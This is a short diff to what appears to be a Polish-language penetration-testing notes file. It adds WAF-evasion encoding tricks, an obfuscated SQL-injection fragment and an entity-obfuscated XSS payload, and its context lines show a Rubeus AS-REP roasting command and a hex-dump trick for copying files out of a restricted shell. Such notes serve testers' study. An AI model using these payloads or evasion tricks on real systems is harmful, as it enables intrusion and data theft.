@@ -680,6 +680,14 @@ https://github.com/GhostPack/Rubeus
 Rubeus.exe asreproast
 ```
 ## Notatki
+### Encoding
+URL-encoding: / => %2f
+Hex-encoding: _ => \x5f, 0x5f
+Unicode-encoding: % => \u0025
+Case Sensitivity (using mixed-cases to avoid detection)
+Obfuscation using White Space and Delimiters
+'/**/UNION/**/SELECT/**/1,2
+<a/href=j&#x0D;avascript:a&#x0D;lert(1)>aaa</a>
 ### Jeśli masz ograniczony shell i nie możesz przesłać pliku, możesz go "wypluć" jako tekst i skopiować:
 ```
 xxd -p tajny_plik.zip > data.hex
